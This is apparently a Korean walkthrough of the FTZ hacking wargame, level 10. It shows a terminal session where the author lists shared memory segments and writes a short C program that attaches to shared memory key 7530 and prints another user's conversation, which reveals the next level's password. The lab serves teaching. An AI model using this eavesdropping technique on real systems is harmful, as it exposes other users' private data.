login as: level10
level10@hhytruth's password:
[level10@ftz level10]$ ll
total 16
-rw-r-----    1 root     level10       253 Jan 14  2010 hint
drwxr-x---    2 root     root         4096 Mar 29  2003 program
drwxr-xr-x    2 root     level10      4096 Feb 24  2002 public_html
drwxrwxr-x    2 root     level10      4096 Jan 16  2009 tmp
[level10@ftz level10]$ cat hint


두명의 사용자가 대화방을 이용하여 비밀스런 대화를 나누고 있다.
그 대화방은 공유 메모리를 이용하여 만들어졌으며,
key_t의 값은 7530이다. 이를 이용해 두 사람의 대화를 도청하여
level11의 권한을 얻어라.

- 레벨을 완료하셨다면 소스는 지우고 나가주세요.


[level10@ftz level10]$ ipcs	### 공유 메모리 관련 명령어

------ Shared Memory Segments --------
key        shmid      owner      perms      bytes      nattch     status
0x00001d6a 0          root      666        1028       0
### 0x00001d6a를 16에서 10진법으로 바꾸면 key_t값인 7530
### -> root 권한을 가진 사람이 존재, 퍼미션 666, 바이트 크기: 1028 byte
------ Semaphore Arrays --------
key        semid      owner      perms      nsems

------ Message Queues --------
key        msqid      owner      perms      used-bytes   messages

[level10@ftz level10]$ cat > abc.c	### c 파일 작성
-bash: abc.c: No such file or directory
[level10@ftz level10]$ cd temp
-bash: cd: temp: No such file or directory
[level10@ftz level10]$ cd tmp
[level10@ftz tmp]$ cat > abc.c
#include <stdio.h>
#include <sys/shm.h>		### 공유메모리 관련 헤더
#include <sys/ipc.h>		### 공유메모리 관련 헤더

int main(){
int i;
char *pA;
i=shmget(7530,1028,IPC_CREAT|0666);
### shmget([key_t key],[int size],[int shmflg]);
### shmget 은 커널에 공유메모리 공간을 요청하기 위해 호출하는 시스템 호출 함수
shmget을 이용해서 새로운 공유메모리 영역을 생성 또는 기존 공유메모리 영역을 참조 가능
3번째 argument는 공유메모리의 접근권한과 생성방식을 명시(IPC_CREAT 또는 IPC_EXCL)
IPC_CREAT|0666: 권한 지정 가능(실행권한 제외)

pA=shmat(i,NULL,0);
### shmat을 통해 지금의 프로세스가 공유메모리를 사용가능하도록 덧붙임 작업
### 첫번째 argument: shmget을 이용해서 얻어낸 식별자 번호
두번째: 메모리가 붙을 주소, 0 사용 경우 커널이 명시, 특별한 사항이 없으면 0 사용
세번째: 아무값도 지정하지 않을 경우 읽기/쓰기 가능

printf("%s",pA);	### pA를 문자열로 출력
return 0;
}

[level10@ftz tmp]$ gcc -o abc abc.c		### 컴파일
[level10@ftz tmp]$ ll
total 16
-rwxrwxr-x    1 level10  level10     11767 Dec 21 20:27 abc
-rw-rw-r--    1 level10  level10       177 Dec 21 20:27 abc.c
[level10@ftz tmp]$ abc	### 실행
-bash: abc: command not found
[level10@ftz tmp]$ ./abc
멍멍: level11의 패스워드는?
구타: what!@#$?
[level10@ftz tmp]$
